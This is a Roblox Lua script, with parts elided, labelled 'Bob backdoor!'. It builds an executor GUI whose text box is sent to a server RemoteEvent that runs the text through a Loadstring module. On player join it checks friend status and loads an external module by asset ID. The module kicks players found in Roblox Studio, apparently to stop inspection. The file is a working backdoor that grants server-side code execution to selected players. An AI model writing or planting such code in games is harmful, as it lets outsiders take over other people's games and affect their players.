...
Frame.Position = UDim2.new(0, 92, 0, 148)
Frame.Size = UDim2.new(0, 515, 0, 267)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0147058824, 0, 0.779770017, 0)
TextButton.Size = UDim2.new(0, 130, 0, 44)
...
TextButton_2.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.327886701, 0, 0.779770017, 0)
TextButton_2.Size = UDim2.new(0, 130, 0, 44)
...
TextButton_3.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.639959455, 0, 0.779770017, 0)
TextButton_3.Size = UDim2.new(0, 66, 0, 44)
...
TextButton_4.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.814838469, 0, 0.779770017, 0)
TextButton_4.Size = UDim2.new(0, 76, 0, 44)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "R6"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(-8.33159502e-05, 0, -0.0541666448, 0)
TextLabel.Size = UDim2.new(0, 515, 0, 14)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Bob backdoor!"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(182, 182, 182)
TextBox.BorderColor3 = Color3.fromRGB(152, 152, 152)
TextBox.Position = UDim2.new(0.0158272143, 0, 0.0139563056, 0)
TextBox.Size = UDim2.new(0, 497, 0, 195)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.MultiLine = true
TextBox.PlaceholderColor3 = Color3.fromRGB(206, 206, 206)
TextBox.PlaceholderText = "--ahh require script aqui"
TextBox.Text = ""
...
do -- nil.MainModule
	...
	local function module_script()
		...
		function module.YourModuleLoad(playerName)
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local isStudio = RunService:IsStudio()
		
			for _, player in ipairs(Players:GetPlayers()) do
				if string.sub(player.Name:lower(), 1, #playerName) == playerName:lower() then
		
					if isStudio then
						player:Kick("Dont play on Roblox Studio S K I D")
						script:Destroy()
						return
					end
...
local function YKKYEQ_fake_script() -- Frame.LocalScript 
	...
	-- Aplica drag em todos os filhos (e no frame pai)
	enableDrag(frame)
	...
	-- Para novos elementos adicionados depois
...
coroutine.wrap(YKKYEQ_fake_script)()
local function YOTP_fake_script() -- TextButton.Script 
	...
	local a = script.Parent.RemoteEvent
	a.OnServerEvent:Connect(function(orc1, brah)
		require(script.Loadstring)(brah)()
	end)
	
end
coroutine.wrap(YOTP_fake_script)()
local function OWXNF_fake_script() -- TextButton.LocalScript 
	...
	local p = script.Parent.RemoteEvent
	
	script.Parent.MouseButton1Click:Connect(function()
		p:FireServer(script.Parent.Parent.TextBox.Text)
	end)
end
coroutine.wrap(OWXNF_fake_script)()
local function JTQEX_fake_script() -- TextButton_2.LocalScript 
...
coroutine.wrap(JTQEX_fake_script)()
local function ELOZGG_fake_script() -- TextButton_3.LocalScript 
...
coroutine.wrap(ELOZGG_fake_script)()
local function GLIORNE_fake_script() -- TextButton_3.ServerEvents 
...
coroutine.wrap(GLIORNE_fake_script)()
local function TWZSYBL_fake_script() -- TextButton_4.LocalScript 
...
coroutine.wrap(TWZSYBL_fake_script)()
local function XXOOKAP_fake_script() -- nil.Script 
...
coroutine.wrap(XXOOKAP_fake_script)()
local function PSQPI_fake_script() -- ScreenGui.Script 
	...
	Players.PlayerAdded:Connect(function(plr)
		...
		if success and isFriend then
			pcall(function()
				require(90193486541655).YourModuleLoad(plr.Name)
			end)
		end
...
coroutine.wrap(PSQPI_fake_script)()
